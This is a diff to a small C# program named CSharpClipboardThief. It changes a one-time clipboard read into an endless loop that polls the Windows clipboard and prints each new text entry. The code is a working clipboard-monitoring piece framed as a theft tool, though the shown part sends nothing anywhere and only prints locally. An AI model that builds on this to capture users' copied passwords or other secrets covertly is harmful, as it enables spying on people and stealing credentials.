@@ -21,14 +21,22 @@ namespace CSharpClipboardThief
 
         static void Main(string[] args)
         {
-            bool openCliboard = OpenClipboard(IntPtr.Zero);
-            IntPtr areaDeTransferencia = GetClipboardData(13);
-            IntPtr alock = GlobalLock(areaDeTransferencia);
-            string texto = Marshal.PtrToStringUni(alock);
-            GlobalUnlock(alock);
-            CloseClipboard();
-            Console.WriteLine(texto);
+            string texto2 = "T";
+            while (true)
+            {
 
+                bool openCliboard = OpenClipboard(IntPtr.Zero);
+                IntPtr areaDeTransferencia = GetClipboardData(13);
+                IntPtr alock = GlobalLock(areaDeTransferencia);
+                string texto = Marshal.PtrToStringUni(alock);
+                GlobalUnlock(alock);
+                CloseClipboard();
+                if (texto2!= texto)
+                {
+                    Console.WriteLine(texto);
+                    texto2 = texto;
+                }
+            }
         }
     }
 }
